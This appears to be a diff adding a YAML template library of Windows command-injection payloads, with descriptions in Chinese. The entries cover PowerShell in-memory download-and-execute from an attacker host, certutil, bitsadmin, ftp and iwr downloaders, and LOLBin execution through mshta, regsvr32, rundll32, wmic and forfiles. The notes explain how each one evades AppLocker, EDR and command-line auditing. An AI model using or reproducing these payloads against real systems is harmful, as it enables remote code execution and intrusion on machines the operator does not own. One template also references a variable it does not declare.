@@ -1,0 +1,292 @@
+ruleDB: v0.1.0
+# Windows 命令注入模板。
+
+templates:
+  - id: rce.windows.sep.basic
+    name: Windows 命令分隔基础
+    desc: cmd.exe 下用分隔符接在已有命令之后
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: ["&", "&&", "|", "||"], default: "&"}
+    body: "<<sep>><<cmd>>"
+    vars: [cmd]
+    requires: [os-windows]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: rce.windows.powershell.iex
+    name: PowerShell 内存加载执行
+    desc: 从远端拉脚本直接在内存执行，不落盘
+    vuln: [rce]
+    content_type: [powershell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: ["&", "&&", "|"], default: "&"}
+    body: "<<sep>>powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://<<lhost>>/<<file>>')\""
+    vars: [lhost, file]
+    requires: [os-windows, outbound, listener, recon]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: rce.windows.download.certutil
+    name: certutil 下载文件
+    desc: 用系统自带 certutil 落地文件，再执行
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: ["&", "&&", "|"], default: "&"}
+    body: "<<sep>>certutil -urlcache -f http://<<lhost>>/<<file>> %TEMP%\\<<file>> & %TEMP%\\<<file>>"
+    vars: [lhost, file]
+    requires: [os-windows, outbound, listener]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: rce.windows.download.bitsadmin
+    name: bitsadmin 下载文件
+    desc: 另一个系统自带的 LOLBin。certutil 被 EDR 盯上时换它
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: ["&", "&&", "|"], default: "&"}
+    body: "<<sep>>bitsadmin /transfer j http://<<lhost>>/<<file>> %TEMP%\\<<file>>"
+    vars: [lhost, file]
+    requires: [os-windows, outbound, listener]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: rce.windows.powershell.b64
+    name: PowerShell 编码命令
+    desc: -enc 收的是 UTF-16LE 的 base64。命令行上不出现任何明文关键字，是最常用来绕命令行审计的一条
+    vuln: [rce]
+    content_type: [powershell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: ["&", "&&", "|"], default: "&"}
+    body: "<<sep>>powershell -nop -w hidden -enc <<b64>>"
+    vars: [b64]
+    requires: [os-windows]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: rce.windows.blind.time
+    name: Windows 时间盲注
+    desc: 无回显时用 ping 的等待制造延时。ping 几乎不会被禁用，比 timeout 可靠
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      sep:  {options: ["&", "&&", "|"], default: "&"}
+      secs: {options: ["3", "5", "10"], default: "5"}
+    body: "<<sep>>ping -n <<secs>> 127.0.0.1"
+    vars: []
+    requires: [os-windows]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: rce.windows.powershell.file.read
+    name: PowerShell 读文件
+    desc: Windows 上没有 cat，读文件走 Get-Content
+    vuln: [rce]
+    content_type: [powershell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: ["&", "&&", "|"], default: "&"}
+    body: "<<sep>>powershell -nop -c \"Get-Content -Path '<<filepath>>'\""
+    vars: [filepath]
+    requires: [os-windows]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- LOLBin：用系统自带、且被 AppLocker 默认放行的签名程序执行 ----
+  # 这一类不落地自己的 exe，命令行上也没有明显的「下载执行」特征，
+  # 比 certutil / bitsadmin 那两条更不容易被基于命令行审计的规则抓到。
+  # 注意 requires 里的 os-windows：这几条换成 Linux 目标一行都不成立。
+
+  - id: rce.windows.lolbin.mshta
+    name: mshta 执行远程 HTA
+    desc: mshta.exe 是微软签名的 HTML 应用宿主，AppLocker 默认规则放行它，所以常被用来绕应用白名单。它拉一个远程 .hta（本质是 HTML + VBScript/JScript）直接执行，不落盘。**需要目标能出网、lhost 上有个 .hta**——HTA 里写 `<script>new ActiveXObject('WScript.Shell').Run('...')</script>`。HTTPS 同样可用，HTTP 被拦时换 https
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: ["&", "&&", "|"], default: "&"}
+    body: "<<sep>>mshta http://<<lhost>>/<<file>>"
+    vars: [lhost, file]
+    requires: [outbound, listener, os-windows]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: rce.windows.lolbin.rundll32
+    name: "rundll32 经 javascript: 执行"
+    desc: 借 mshtml 的 `javascript:` 入口在 rundll32 里跑 JScript——经典的 AppLocker 绕过写法，命令行上只有签名程序的名字。**入口字符串要一字不差**（`\..\mshtml,RunHTMLApplication ` 结尾那个空格是载荷的一部分）。不同 Windows 版本对这段的解析有差异，先在目标上单独发一次 `alert(1)` 版确认入口通，再换成执行命令的这版
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: ["&", "&&", "|"], default: "&"}
+    body: |-
+      <<sep>>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new ActiveXObject("WScript.Shell").Run("<<cmd>>")
+    vars: []
+    requires: [os-windows]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: rce.windows.lolbin.regsvr32
+    name: regsvr32 远程执行 SCT
+    desc: 只用系统自带的 regsvr32 + scrobj.dll 去拉一个远程 SCT（XML 格式的 scriptlet）并执行——不落文件、不写注册表，全程只有两个系统自带组件的名字出现在命令行上。`/s` 静默、`/n` 不调 DllRegisterServer、`/u` 反注册、`/i:` 后面跟 URL。**这是 AppLocker 绕过的经典一条**，也常用来让目标替你去请求 lhost。lhost 上的 `<<file>>` 是一个 `<scriptlet>` 包着 JScript 的 XML
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: ["&", "&&", "|"], default: "&"}
+    body: "<<sep>>regsvr32 /s /n /u /i:http://<<lhost>>/<<file>> scrobj.dll"
+    vars: [lhost, file]
+    requires: [outbound, listener, os-windows]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: rce.windows.lolbin.wmic
+    name: wmic 起进程
+    desc: 用 WMI 起进程，父进程是 WmiPrvSE.exe 而不是注入进程本身——进程树上看不出来源，也常用来跨会话执行。**没有回显**（进程是异步起的），只能用来执行动作或配合盲打（`rce.windows.blind.time`）。注意 Windows 11 24H2 起 wmic 已从系统里移除，只有老系统还有；新系统换 PowerShell 的 `Invoke-CimMethod`
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: ["&", "&&", "|"], default: "&"}
+    body: "<<sep>>wmic process call create \"cmd.exe /c <<cmd>>\""
+    vars: [cmd]
+    requires: [os-windows]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: rce.windows.lolbin.forfiles
+    name: forfiles 代执行
+    desc: forfiles.exe 是系统自带的批处理辅助程序，`/c` 参数收一条**要执行的命令**，于是变成一个签名程序的执行代理。命令行上有 `cmd /c` 但发起方是 forfiles，基于父进程/映像名的规则容易漏掉。`/p` 和 `/m` 只要指向一个确实存在的目录和文件（示例用的是 notepad.exe），命令就会为每个匹配项跑一次
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: ["&", "&&", "|"], default: "&"}
+    body: |-
+      <<sep>>forfiles /p c:\windows\system32 /m notepad.exe /c "cmd /c <<cmd>>"
+    vars: [cmd]
+    requires: [os-windows]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: rce.windows.lolbin.pcalua
+    name: pcalua 代启动程序
+    desc: 程序兼容性助手（pcalua.exe）也是微软签名的，能代你启动一个可执行文件，`-a` 后面给路径。**它只能启动 exe，不能带参数执行任意命令**，所以用法是「先落一个 exe（或者用 UNC / WebDAV 指向 lhost 上的 exe）再用它启动」——单独用它不构成 RCE，是链条里的一环。没有回显
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: ["&", "&&", "|"], default: "&"}
+    body: "<<sep>>pcalua -a <<filepath>>"
+    vars: [filepath]
+    requires: [os-windows]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 下载执行：换个下载器 ----
+
+  - id: rce.windows.powershell.download.alias
+    name: PowerShell 下载（iwr / curl / wget 别名）
+    desc: "`rce.windows.powershell.iex` 那条的等价替代，换成更「现代」的下载 cmdlet。**三个别名指向同一个 Invoke-WebRequest**，参数是 PowerShell 的（`-OutFile` / `-o`），和真 curl 的 `-o`、`-O` 语义不同。还有个容易踩的点：Windows 10 1803+ 的 System32 里有个**真 curl.exe**——在 cmd 里敲 `curl` 走的是它，在 PowerShell 里敲 `curl` 走的是 IWR 别名。约束语言模式（ConstrainedLanguage）下 IWR 不可用，那就只能回退到 `IEX(New-Object Net.WebClient)` 那条"
+    vuln: [rce]
+    content_type: [powershell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: ["&", "&&", "|"], default: "&"}
+      tool:
+        options:
+          - {id: iwr,        name: "iwr（Invoke-WebRequest 的正式别名）",           raw: "iwr http://<<lhost>>/<<file>> -OutFile $env:TEMP\\<<file>>"}
+          - {id: curl_alias, name: "curl（PowerShell 里是 IWR 别名，不是真 curl）", raw: "curl http://<<lhost>>/<<file>> -OutFile $env:TEMP\\<<file>>"}
+          - {id: wget_alias, name: "wget（同上，另一个别名）",                      raw: "wget http://<<lhost>>/<<file>> -OutFile $env:TEMP\\<<file>>"}
+        default: iwr
+    body: "<<sep>>powershell -nop -w hidden -c \"<<tool.raw>>; & $env:TEMP\\<<file>>\""
+    vars: [lhost, file]
+    requires: [outbound, listener, os-windows]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: rce.windows.download.ftp
+    name: ftp 内置客户端下载
+    desc: certutil / bitsadmin 都被 EDR 盯上、但 ftp.exe 还在时用。把一串 FTP 命令写进一个临时脚本文件，再用 `ftp -s:` 批量执行——**只负责下载，执行要另一条**。要求 lhost 上有个允许匿名登录的 FTP 服务；ftp.exe 在部分加固过的镜像里被移除了，先 `where ftp` 确认
+    vuln: [rce]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: ["&", "&&"], default: "&"}
+    body: |-
+      <<sep>>echo open <<lhost>> > %TEMP%\f.txt && echo anonymous >> %TEMP%\f.txt && echo x >> %TEMP%\f.txt && echo binary >> %TEMP%\f.txt && echo get <<file>> >> %TEMP%\f.txt && echo bye >> %TEMP%\f.txt && ftp -s:%TEMP%\f.txt
+    vars: [lhost, file]
+    requires: [outbound, listener, os-windows]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: rce.windows.powershell.scriptblock
+    name: PowerShell 脚本块加载（免杀写法）
+    desc: "`-EncodedCommand` 之外的另一条免杀写法：把整段逻辑包进 `& { }` 脚本块，并且**不让 `IEX(...DownloadString(...))` 这个连续特征出现**——中间插了变量赋值和请求头设置。顺带把 UA 改成浏览器的，绕开只看默认 `Mozilla/4.0 (compatible; MSIE ...)` UA 的检测。功能上它就是内存加载那条，选哪条取决于目标上线了哪种检测规则"
+    vuln: [rce]
+    content_type: [powershell-command]
+    component: []
+    version: "*"
+    slots:
+      sep: {options: ["&", "&&", "|"], default: "&"}
+    body: "<<sep>>powershell -nop -w hidden -c \"& {$c=New-Object Net.WebClient;$c.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64)');IEX $c.DownloadString('http://<<lhost>>/<<file>>')}\""
+    vars: [lhost, file]
+    requires: [outbound, listener, os-windows]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
